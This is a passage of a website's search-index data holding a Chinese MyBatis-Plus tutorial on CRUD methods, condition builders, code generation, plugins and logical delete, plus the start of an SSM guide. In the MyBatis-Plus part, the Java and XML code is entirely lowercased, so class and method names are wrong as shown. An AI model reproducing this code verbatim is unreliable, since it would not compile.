value="info" />\n    </logger>\n    <root>\n        <level value="debug" />\n        <appender-ref ref="stdout" />\n    </root>\n</log4j:configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# mybatis配置文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 替换mybatisplus\n\nspring配置文件中将我们添加的sqlsessionfactorybean替换为mybatissqlsessionfactorybean。\n\n<bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">\n\n\n1\n\n\n\n# 入门通用crud\n\n\n# insert\n\n提出问题: 假设我们已存在一张tbl_employee表，且已有对应的实体类employee，实现tbl_employee表的crud操作我们需要做什么呢？\n\n实现方式:\n\n基于mybatis：需要编写employeemapper接口，并手动编写crud方法 提供employeemapper.xml映射文件，并手动编写每个方法对应的sql语句.\n\n基于mp：只需要创建employeemapper接口, 并继承basemapper接口.这就是使用mp需要完成的所有操作，甚至不需要创建sql映射文件。\n\n 1. 编写接口集成basemapper\n\npackage com.pwddd.mp.mapper;\n\nimport com.baomidou.mybatisplus.mapper.basemapper;\nimport com.pwddd.mp.bean.employee;\n\n// 泛型 填写当前mapper所对应的实体类\npublic interface employeemapper extends basemapper<employee> {\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 编写测试方法\n\nprivate applicationcontext ac = new classpathxmlapplicationcontext("applicationcontext.xml");\nprivate employeemapper employeemapper = ac.getbean("employeemapper", employeemapper.class);\n\n@test\npublic void testenv() throws sqlexception {\n    employee employee = new employee();\n    employee.setlastname("zhangsan");\n    employee.setemail("zhangsan@qq.com");\n    employee.setgender(1);\n    employee.setage(24);\n    system.out.println(employeemapper.insert(employee));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n运行时会抛异常，主要原因时id的类型为问题。\n\n could not set property \'id\' of \'class com.pwddd.mp.bean.employee\' with value \'1496379627045040130\' cause: java.lang.illegalargumentexception: argument type mismatch\n\n\n1\n\n\n出现异常的原因：mybatisplus提供了四种主键的策略。我们并没有设置主键的策略，对于mybatisplus来说，有如下的几种主键策略:\n\n值               描述\nauto            数据库 id 自增\nnone            无状态，该类型为未设置主键类型（注解里等于跟随全局，全局里约等于 input）\ninput           insert 前自行 set 主键值\nassign_id       分配 id(主键类型为 number(long 和 integer)或 string)(since\n                3.3.0),使用接口identifiergenerator的方法nextid(默认实现类为defaultidentifiergenerator雪花算法)\nassign_uuid     分配 uuid,主键类型为 string(since\n                3.3.0),使用接口identifiergenerator的方法nextuuid(默认 default 方法)\nid_worker       分布式全局唯一 id 长整型类型(please use assign_id) 弃用\nuuid            32 位 uuid 字符串(please use assign_uuid) 弃用\nid_worker_str   分布式全局唯一 id 字符串类型(please use assign_id) 弃用\n\n在开发过程中，使用tableid设置主键策略。共有两个属性：\n\n * value: 如果表中数据的值和项目中bean的属性名不同，或者不遵行驼峰命名法，则需要进行设置\n * type: 设置主键策略idtype的枚举，需要对应表中的主键的策略。\n\npublic class employee {\n\n    @tableid(value = "id",type = idtype.auto)\n    private integer id;\n\n\n1\n2\n3\n4\n\n\n修改后又报错：\n\n### error updating database.  cause: com.mysql.jdbc.exceptions.jdbc4.mysqlsyntaxerrorexception: table \'mybatisplus.employee\' doesn\'t exist\n\n\n1\n\n\n出现这个问题的原因是，mybatisplus会根据实体类的类名去数据库中找相关的表名。因为我们数据库中的表名称和类名并不对应，因此会报错。mybatisplus也提供了相关的注解去设置寻找的名称。tablename\n\n@tablename("tbl_employee")\npublic class employee {\n\n\n1\n2\n\n\n如果数据库的相关列和实体类的的名称不对应，(如last_name和lastname)。mybaitsplus是如何保证数据能够转化。\n\nmp全局策略配置中有如下的默认配置，该配置类似于mybatis的驼峰命名法的转化，并且默认开启。\n\n<bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n    <property name="dbcolumnunderline" value="true" />\n</bean>\n\n\n1\n2\n3\n\n\n如果我们将该字段修改为false，那么mp并不会自动将驼峰命名进行匹配。我们还可以通过@tablefiled注解，用value指定对应的数据库列名称。exist表示在数据库中有没有对应的字段存在，默认是在数据库中有对应的字段。如果对应的javabean在表中没有相关的映射，那么在进行数据库操作时就会报错，我们将该字段的exist设置成false，就可以忽略这个字段。\n\n@tablefield(value = "last_name")\nprivate string lastname;\n\n@tablefield(exist = false)\nprivate double salary;\n\n\n1\n2\n3\n4\n5\n\n\n那么对于我们的主键策略，和对应的表名称的映射，如果每个实体类都需要进行配置，则过于麻烦，mp提供了全局配置的方式。\n\n<bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n    <property name="dbcolumnunderline" value="true" />\n    \x3c!--全局配置 --\x3e\n    <property name="idtype" value="0" />\n</bean>\n\n\n1\n2\n3\n4\n5\n\n\n我们配置了idtype为0之后，会调用枚举类的getidtype方法，该方法根据我们传入的idtype的key去找对应的主键策略类型\n\n\n\n我们加上全局的配置之后，还需要将配置注入到sqlsession中，否则不会起作用。\n\n    <bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- 别名处理 --\x3e\n        <property name="typealiasespackage" value="com.pwddd.mp.beans" />\n        <property name="globalconfig" ref="globalconfiguration" />\n    </bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@tablename注解会指定实体类对应的表名称，我们在创建数据库表的时候通常会给表加上一些固定的表前缀，这会导致我们的实体类和表名称不对应。因此在mp中也提供了添加表前缀的全局配置。\n\n<property name="tableprefix" value="tbl_" />\n\n\n1\n\n\n在mybatis里面，在插入操作后如果需要获取mybatis插入之后数据的主键值，需要在mapper映射文件中的select标签里面设置两个标签值，一个是主键的自增，一个是我们返回到插入实体的javabean的对应属性。\n\nusegeneratedkeys="true" keyproperty="userid"\n\n\n1\n\n\n**而在mybatisplus中会自动将插入数据的主键值自动注入到我们的插入实体中。**不需要我们进行任何操作。\n\ninsert方法在进行插入操作时，会自动的判断插入字段对应的值是否为null，如果为null则在插入操作中就不插入该值了。如果我们需要全字段的插入值，我们需要使用insertallcolumn方法。\n\ndebug 02-23 15:36:22,520 ==>  preparing: insert into tbl_employee ( last_name,email,gender,age ) values ( ?,?,?,? )  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n\n# update\n\nmp为我们提供了通用的update方法，updatebyid，和上面的insert一样，如果不传入对应的参数，则mp不会对该参数对应的数据库列值进行修改。同时mp还提供了类似insertallcolumns的方法updateallcolumnsbyid。\n\n@test\npublic void testupdate(){\n    employee employee = new employee();\n    employee.setid(1);\n    employee.setage(11);\n    employee.setgender(1);\n    //        employee.setemail("helo@qq.com");\n    //        employee.setlastname("haha");\n    //        employeemapper.updatebyid(employee);\n    employeemapper.updateallcolumnbyid(employee);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# select\n\nmp提供了多个查询方法：\n\n * selectbyid\n * selecgtone\n * selectbatchsids\n * selectbymap\n * selectpage\n\n# selectbyid\n\n@test\npublic void testselect(){\n    employee employee = employeemapper.selectbyid(1);\n    system.out.println(employee);\n}\n\n//employee{id=1, lastname=\'null\', email=\'null\', gender=1, age=11}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# selectone\n\n如果我们需要其他的列进行查询，则不能使用selectbyid进行查询了。我们需要用实体类封装我们需要查询的条件，然后使用selectone进行查询。mp会将我们封装的非空的属性充当查询的条件。\n\n@test\npublic void testselect(){\n    //        employee employee = employeemapper.selectbyid(1);\n    //        system.out.println(employee);\n    employee employee = new employee();\n    employee.setage(25);\n    employee.setgender(0);\n    employee employee1 = employeemapper.selectone(employee);\n    system.out.println(employee1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\ndebug 02-23 15:53:07,967 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee where gender=? and age=?  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n如果存在匹配的多条数据，则查询将会报错。\n\n# selectbatchsids\n\n通过多个id进行批量的查询。\n\nlist<integer> list = new arraylist<>();\nlist.add(1);\nlist.add(2);\nlist.add(6);\nsystem.out.println(employeemapper.selectbatchids(list));\n\n\n1\n2\n3\n4\n5\n\n\n查询语句:\n\ndebug 02-23 15:55:50,296 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee where id in ( ? , ? , ? )  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n# selectbymap\n\n通过map封装我们的查询条件，获得批量的结果。\n\nhashmap<string, object> map = new hashmap<>();\n// 注意： map的key是数据库中对应的列名\nmap.put("last_name","zhangsan");\nmap.put("gender",1);\nsystem.out.println(employeemapper.selectbymap(map));\n\n\n1\n2\n3\n4\n5\n\n\n需要注意的是，selectbymap接受的参数是一个columnmap，也就是说，我们在封装查询条件时，需要传入的map的key对应的是数据库中的列名称，而不是我们javabean的属性名。\n\n# selectpage\n\nselectpage是mp帮助我们方便的进行分页查询的方法。该方法有两个参数，一个是rowbounds,还有wapper条件查询器。其中rowbounds我们可以使用该类的子类page\n\nlist<t> selectpage(rowbounds var1, @param("ew") wrapper<t> var2);\n\n\n1\n\n\n使用方法：\n\nsystem.out.println(employeemapper.selectpage(new page<>(2, 2), null));\n\n\n1\n\n\n查询语句:\n\ndebug 02-23 16:05:17,595 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n我们发现，mp不是使用limit关键字进行分页的，mp底层还是利用rowbounds进行实现的。该分页是使用了内存分页的技术实现的，如果要使用物理分页，需要使用相关的分页插件。\n\n\n# delete\n\nmp提供的通用删除方法有如下几种：\n\n * deletebyid\n * deletebymap\n * deletebybatchids\n\n使用方法：\n\n//1. 根据id进行删除操作\nsystem.out.println(employeemapper.deletebyid(11));\n//2. 根据map封装删除条件\nhashmap<string, object> map = new hashmap<>();\nmap.put("last_name","zhangsan");\nmap.put("id",10);\nsystem.out.println(employeemapper.deletebymap(map));\n\n//3. 批量删除操作\narraylist<integer> list = new arraylist<>();\nlist.add(1);\nlist.add(2);\nlist.add(3);\nsystem.out.println(employeemapper.deletebatchids(list));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# mp启动注入sql的原理\n\n问题：xxxmapper继承了basemapper，basemapper中提供了相关的crud方法，那么必须还有sql语句，最终还是通过mybatis进行操作数据。\n\n 1. xxxmapper的本质是一个代理类的对象。\n 2. 在mapperproxy中有一个sqlsession，sqlsession我们能找到具体的sqlsessionfactory\n 3. 在sqlsessionfactory中有一个configuration对象，该对象中会有mapstatedment对象，该对象封装了我们具体的查询语句。\n 4. 在mp中有一个sql自动注入类：autosqlinjector，该类负责注入sql语句。\n\n\n# 条件构造器\n\n现有一个需求，我们需要分页查询tbl_employee表中，年龄在18~50之间、性别为男、且姓名为 xx 的所有用户，这时候我们该如何实现上述需求呢？\n\nmybatis : 需要在sql映射文件中编写带条件查询的sql,并基于pagehelper插件完成分页.\n\n实现以上一个简单的需求，往往需要我们做很多重复单调的工作。普通的mapper能够解决这类痛点吗？\n\nmp: 依旧不用编写sql语句, mp提供了功能强大的条件构造器entitywrapper。\n\n条件构造器类似于mybatis里面逆向工程中生成的xxxexample，我们可以使用criteria进行查询，这种查询风格称之为qbc(query by criteria)，在mp中称为条件构造器。mp中有两种方式使用条件构造器，分别是entitywrapper和condition。两种方式使用基本类似。\n\n使用条件构造器完成增删改查：\n\n    @test\n    public void qbc(){\n        // 使用ew进行分页查询\n        system.out.println(employeemapper.selectpage(new rowbounds(1, 3),\n                new entitywrapper<employee>()\n                        .eq("last_name", "zhangsan")\n                        .ornew() // ornew会将前面所有的条件作为一个整体\n                        //                        .or() // or会和前面的条件并列\n                        .eq("gender", 0)\n        ));\n\n        // 使用ew查询列表\n        system.out.println(employeemapper.selectlist(new entitywrapper<employee>()\n                .eq("last_name", "zhangsan")\n                .between("age", 10, 20)\n        ));\n\n        // 使用ew条件更新\n        employee employee = new employee();\n        employee.setlastname("lisi");\n        employee.setgender(0);\n        employeemapper.update(employee,new entitywrapper<employee>()\n                .eq("id",8)\n        );\n\n        //使用condition进行条件删除\n        employeemapper.delete(\n                condition.create()\n                        .eq("id",8)\n        );\n\n        // last orderby查询\n        system.out.println(employeemapper.selectlist(new entitywrapper<employee>()\n//                .orderdesc(arrays.aslist("age"))\n//                .orderasc(arrays.aslist("age"))\n//                        .orderby("age")\n                        .last("order by age desc")  // 容易造成sql注入\n        ));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 活动记录 - activerecord\n\nactive record(活动记录)，是一种领域模型模式，特点是一个模型类对应关系型数据库中的一个表，而模型类的一个实例对应表中的一行记录。\n\n开启ar，需要让被查询的实体类继承model类，并且实现相应的方法。方法返回主键。\n\npublic class employee extends model<employee> {\n    @override\n    protected serializable pkval() {\n        return id;\n    }\n\n\n1\n2\n3\n4\n5\n\n\n基础操作：\n\n1) 插入操作\npublic boolean insert()\n2) 修改操作\npublic boolean updatebyid()\n3) 查询操作\npublic t selectbyid()\npublic t selectbyid(serializable id)\npublic list&lt;t> selectall()\npublic list&lt;t> selectlist(wrapper wrapper)\npublic int selectcount(wrapper wrapper)\n4) 删除操作\npublic boolean deletebyid()\npublic boolean deletebyid(serializable id)\npublic boolean delete(wrapper wrapper)\n5) 分页复杂操作\npublic page&lt;t> selectpage(page&lt;t> page, wrapper&lt;t> wrapper)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n@test\npublic void testar(){\n    // 插入操作\n    employee employee = new employee();\n    employee.setlastname("lisi");\n    employee.setage(23);\n    employee.setemail("zhangsan@qq.com");\n    employee.setgender(1);\n    employee.insert();\n    //修改操作\n    employee.setid(7);\n    employee.updatebyid();\n    // 查询操作\n    system.out.println(employee.selectbyid());\n    system.out.println(employee.selectbyid(6));\n    system.out.println(employee.selectall());\n    system.out.println(employee.selectlist(new entitywrapper().eq("last_name", "zhangsan")));\n    system.out.println(employee.selectcount(new entitywrapper().eq("last_name", "zhangsan")));\n    //删除操作\n    employee.deletebyid();\n    employee.deletebyid(1);\n    employee.delete(new entitywrapper().eq("id",20));\n\n    system.out.println(employee.selectpage(new page<>(1, 2),\n                                           new entitywrapper<employee>().like("last_name", "%a%")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 代码生成器\n\nmp提供了大量的自定义设置，生成的代码完全能够满足各类型的需求\n\nmp的代码生成器和mybatismbg代码生成器:\n\nmp 的代码生成器都是基于 java 代码来生成。\n\nmbg 基于 xml 文件进行代码生成。\n\nmybatis的代码生成器可生成: 实体类、mapper接口、mapper映射文件\n\nmp的代码生成器可生成: 实体类(可以选择是否支持 ar)、mapper接口、mapper映射文件、 service层、controller层。\n\n添加依赖\n\n由于mp使用的是基于apache的velocity模板技术，因此需要引入相关的依赖包，同时也可以替换为其他的模板。并且需要添加日志相关的依赖。\n\n<dependency>\n <groupid>org.apache.velocity</groupid>\n <artifactid>velocity-engine-core</artifactid>\n <version>2.0</version>\n</dependency>\n\n<dependency>\n<groupid>org.slf4j</groupid>\n<artifactid>slf4j-api</artifactid>\n<version>1.7.7</version>\n</dependency>\n<dependency>\n<groupid>org.slf4j</groupid>\n<artifactid>slf4j-log4j12</artifactid>\n<version>1.7.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n生成代码\n\n@test\npublic void testgenerator() {\n    /*全局配置*/\n    globalconfig config = new globalconfig();\n    config.setactiverecord(true) /*是否支持ar模式*/\n        .setauthor("jm") /*作者*/\n        .setoutputdir("e:\\\\workspace\\\\code\\\\java\\\\study\\\\mybatisplus\\\\src\\\\main\\\\java")\n        /*生成路径*/\n        .setfileoverride(true)/*文件覆盖*/\n        .setservicename("%sservice") /*设置生成的service接口名  首字母是否为i*/\n        .setidtype(idtype.auto) /*主键策略*/\n        ;\n\n    /*数据源配置*/\n    datasourceconfig dsconfig = new datasourceconfig();\n    dsconfig.setdbtype(dbtype.mysql)\n        .seturl("jdbc:mysql://localhost:3306/mybatisplus")\n        .setdrivername("com.mysql.jdbc.driver")\n        .setusername("root")\n        .setpassword("123456");\n    /*策略配置*/\n    strategyconfig stconfig = new strategyconfig();\n    stconfig.setcapitalmode(true) /* 全局大写命名*/\n        .setdbcolumnunderline(true) /*表名 字段名 是否使用下滑 线命名*/\n        .setnaming(namingstrategy.underline_to_camel) /* 数据 库表映射到实体的命名策略*/\n        .setinclude("tbl_employee") /*生成的表*/\n        .settableprefix("tbl_"); // 表前缀\n    /*包名策略*/\n    packageconfig pkconfig = new packageconfig();\n    pkconfig.setparent("com.pwddd.mp")\n        .setcontroller("controller")\n        .setentity("beans")\n        .setservice("service");\n    autogenerator ag = new\n        autogenerator().setglobalconfig(config).setdatasource(dsconfig)\n        .setstrategy(stconfig)\n        .setpackageinfo(pkconfig);\n    ag.execute();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 插件\n\n\n# 分页插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册分页插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.paginationinterceptor"></bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 执行分析插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册执行分析插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.sqlexplaininterceptor">\n            <property name="stopproceed" value="true"></property>\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 乐观锁插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册乐观锁插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.optimisticlockerinterceptor">\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 执行分析插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册性能分析插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.performanceinterceptor">\n            <property name="format" value="true"></property>\n            \x3c!-- <property name="maxtime" value="5"></property> --\x3e\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 测试代码\n\npublic class testmp {\n    applicationcontext ctx  = new classpathxmlapplicationcontext("applicationcontext.xml");\n    employeemapper employeemapper = ctx.getbean("employeemapper",employeemapper.class);\n\n    /**\n\t * 测试 乐观锁插件\n\t */\n\n    @test\n    public void testoptimisticlocker() {\n        //更新操作\n        employee employee = new employee();\n        employee.setid(15);\n        employee.setlastname("tomaa");\n        employee.setemail("tomaa@sina.com");\n        employee.setgender("1");\n        employee.setage(22);\n        employee.setversion(3);\n        employeemapper.updatebyid(employee);\n\n    }\n\n    /**\n\t * 测试 性能分析插件\n\t */\n    @test\n    public void testperformance() {\n        employee employee = new employee();\n        employee.setlastname("玛利亚老师");\n        employee.setemail("mly@sina.com");\n        employee.setgender("0");\n        employee.setage(22);\n        employeemapper.insert(employee);\n\n    }\n\n    /**\n\t * 测试sql执行分析插件\n\t */\n    @test\n    public void testsqlexplain() {\n\n        employeemapper.delete(null);  // 全表删除\n    }\n\n    /**\n\t * 测试分页插件\n\t */\n    @test\n    public void testpage() {\n        page<employee> page = new page<>(1,1);\n        list<employee > emps = \n            employeemapper.selectpage(page, null);\n        system.out.println(emps);\n        system.out.println("===============获取分页相关的一些信息======================");\n        system.out.println("总条数:" +page.gettotal());\n        system.out.println("当前页码: "+  page.getcurrent());\n        system.out.println("总页码:" + page.getpages());\n        system.out.println("每页显示的条数:" + page.getsize());\n        system.out.println("是否有上一页: " + page.hasprevious());\n        system.out.println("是否有下一页: " + page.hasnext());\n\n        //将查询的结果封装到page对象中\n        page.setrecords(emps);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n\n# 自定义全局操作\n\n\n# autosqlinjector\n\n根据mybatisplus的autosqlinjector可以自定义各种你想要的sql ,注入到全局中，相当于自定义mybatisplus自动注入的方法。\n\n 1. 在mapper接口中定义相关的方法\n    \n    public interface employeemapper extends basemapper<employee> {\n        int deleteall();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n 2. 扩展autosqlinjector.inject方法，实现mapper接口中方法要注入的sql\n    \n    public class myinjector extends autosqlinjector {\n        @override\n        public void inject(configuration configuration, mapperbuilderassistant builderassistant, class<?> mapperclass, class<?> modelclass, tableinfo table) {\n            //将employeemapper中定义的deleteall， 处理成对应的mappedstatement对象，加入到configuration对象中。\n    \n            //注入的sql语句\n            string sql = "delete from " +table.gettablename();\n            //注入的方法名   一定要与employeemapper接口中的方法名一致\n            string method = "deleteall" ;\n    \n            //构造sqlsource对象\n            sqlsource sqlsource = languagedriver.createsqlsource(configuration, sql, modelclass);\n    \n            //构造一个删除的mappedstatement\n            this.adddeletemappedstatement(mapperclass, method, sqlsource);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. 在mp全局策略中，配置自定义注入器\n    \n    <bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n        <property name="dbcolumnunderline" value="true" />\n        \x3c!--全局配置 --\x3e\n        <property name="idtype" value="0" />\n    \n        <property name="tableprefix" value="tbl_" />\n        <property name="sqlinjector" ref="injector" />\n        </bean>\n    \n        <bean class="com.pwddd.mp.mpconfig.myinjector" id="injector"/>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n\n# 逻辑删除\n\n假删除、逻辑删除: 并不会真正的从数据库中将数据删除掉，而是将当前被删除的这条数据中的一个逻辑删除字段置为删除状态。\n\n 1. 配置逻辑删除bean\n    \n    \x3c!-- 逻辑删除 --\x3e\n    \t<bean id="logicsqlinjector" class="com.baomidou.mybatisplus.mapper.logicsqlinjector"></bean>\n    \n    \n    1\n    2\n    \n\n 2. 注入逻辑删除属性\n    \n    \x3c!-- 注入逻辑删除 --\x3e\n        <property name="sqlinjector" ref="logicsqlinjector" />\n    \n    \n    1\n    2\n    \n\n 3. 配置逻辑删除值\n    \n    \x3c!-- 注入逻辑删除全局值 --\x3e\n    <property name="logicdeletevalue" value = "-1"></property>\n    <property name="logicnotdeletevalue" value="1"></property>\n    \n    \n    1\n    2\n    3\n    \n\n 4. 在 pojo 的逻辑删除字段 添加 @tablelogic 注解\n    \n    @tablelogic\n    private integer logic_flag;\n    \n    \n    1\n    2\n    \n\n 5. 执行删除，会在mp自带查询和更新方法的sql后面，追加『逻辑删除字段』=『logicnotdeletevalue 默认值』\n\n 6. 删除方法: deletebyid()和其他delete方法, 底层sql调用的是update tbl_xxx set 『逻辑删除字段』=『logicdeletevalue 默认值』\n\n\n# 公共字段自动填充\n\nmetaobject: 元对象。是mybatis提供的一个用于更加方便，更加优雅的访问对象的属性, 给对象的属性设置值的一个对象。还会用于包装对象。支持对object 、map、collection等对象进行包装。\n\n 1. 配置自动填充bean，并注册属性\n    \n    \x3c!-- 公共字段填充 处理器 --\x3e\n    <bean id="mymetaobjecthandler" class="com.atguigu.mp.metaobjecthandler.mymetaobjecthandler"> </bean>\n    \x3c!-- 注入公共字段填充处理器 --\x3e\n    <property name="metaobjecthandler" ref="mymetaobjecthandler"></property>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 编写相关类\n    \n    /**\n     * 自定义公共字段填充处理器\n     */\n    public class mymetaobjecthandler extends metaobjecthandler {\n    \t\n    \t/**\n    \t * 插入操作 自动填充\n    \t */\n    \t@override\n    \tpublic void insertfill(metaobject metaobject) {\n    \t\t//获取到需要被填充的字段的值\n    \t\tobject fieldvalue = getfieldvalbyname("name", metaobject);\n    \t\tif(fieldvalue == null) {\n    \t\t\tsystem.out.println("*******插入操作 满足填充条件*********");\n    \t\t\tsetfieldvalbyname("name", "weiyunhui", metaobject);\n    \t\t}\n    \t\t\n    \t}\n    \t/**\n    \t * 修改操作 自动填充\n    \t */\n    \t@override\n    \tpublic void updatefill(metaobject metaobject) {\n    \t\tobject fieldvalue = getfieldvalbyname("name", metaobject);\n    \t\tif(fieldvalue == null) {\n    \t\t\tsystem.out.println("*******修改操作 满足填充条件*********");\n    \t\t\tsetfieldvalbyname("name", "weiyh", metaobject);\n    \t\t}\n    \t}\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    \n\n 3. 自动填充时，如果我们规定的字段为null，则进行自动填充。\n\n\n# idea插件\n\nmybaitsx插件，可以提供mapper文件和对应接口之间的关联和跳转。',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SSM",frontmatter:{title:"SSM",date:"2022-02-21T00:00:00.000Z",permalink:"/dev/java/core/ssm",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis","Spring","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/04.SSM.html",relativePath:"01.开发/101.后端/1011.微服务核心/04.SSM.md",key:"v-7af8708c",path:"/dev/java/core/ssm/",headers:[{level:2,title:"环境搭建",slug:"环境搭建",normalizedTitle:"环境搭建",charIndex:10},{level:3,title:"引入依赖",slug:"引入依赖",normalizedTitle:"引入依赖",charIndex:19},{level:3,title:"引入前端资源",slug:"引入前端资源",normalizedTitle:"引入前端资源",charIndex:3288},{level:3,title:"配置web.xml",slug:"配置web-xml",normalizedTitle:"配置web.xml",charIndex:3591},{level:3,title:"配置Mybatis配置文件",slug:"配置mybatis配置文件",normalizedTitle:"配置mybatis配置文件",charIndex:10063},{level:3,title:"创建数据库表",slug:"创建数据库表",normalizedTitle:"创建数据库表",charIndex:10501},{level:3,title:"Mybatis逆向工程",slug:"mybatis逆向工程",normalizedTitle:"mybatis逆向工程",charIndex:12264},{level:3,title:"修改生成的Mapper",slug:"修改生成的mapper",normalizedTitle:"修改生成的mapper",charIndex:14790},{level:3,title:"Spring注入 测试Dao层",slug:"spring注入-测试dao层",normalizedTitle:"spring注入 测试dao层",charIndex:16313},{level:2,title:"数据处理",slug:"数据处理",normalizedTitle:"数据处理",charIndex:16993},{level:3,title:"查询员工列表",slug:"查询员工列表",normalizedTitle:"查询员工列表",charIndex:17002},{level:3,title:"添加页面显示部门下拉列表",slug:"添加页面显示部门下拉列表",normalizedTitle:"添加页面显示部门下拉列表",charIndex:29602},{level:3,title:"检测用户名是否可用",slug:"检测用户名是否可用",normalizedTitle:"检测用户名是否可用",charIndex:30722},{level:3,title:"保存用户信息",slug:"保存用户信息",normalizedTitle:"保存用户信息",charIndex:32160},{level:3,title:"更新员工信息",slug:"更新员工信息",normalizedTitle:"更新员工信息",charIndex:40732},{level:3,title:"删除员工信息",slug:"删除员工信息",normalizedTitle:"删除员工信息",charIndex:44520},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:48703}],headersStr:"环境搭建 引入依赖 引入前端资源 配置web.xml 配置Mybatis配置文件 创建数据库表 Mybatis逆向工程 修改生成的Mapper Spring注入 测试Dao层 数据处理 查询员工列表 添加页面显示部门下拉列表 检测用户名是否可用 保存用户信息 更新员工信息 删除员工信息 总结",content:'# SSM\n\n\n# 环境搭建\n\n\n# 引入依赖\n\n引入Maven相关依赖\n\n<dependencies>\n    <dependency>\n        <groupId>junit</groupId>\n        <artifactId>junit</artifactId>\n        <version>4.11</version>\n        <scope>test</scope>\n    </dependency>\n\n    \x3c!--引入项目依赖的jar包 --\x3e\n    \x3c!-- SpringMVC、Spring --\x3e\n\n    \x3c!--引入pageHelper分页插件 --\x3e\n    <dependency>\n        <groupId>com.github.pagehelper</groupId>\n        <artifactId>pagehelper</artifactId>\n        <version>5.0.0</version>\n    </dependency>\n\n    \x3c!-- MBG --\x3e\n    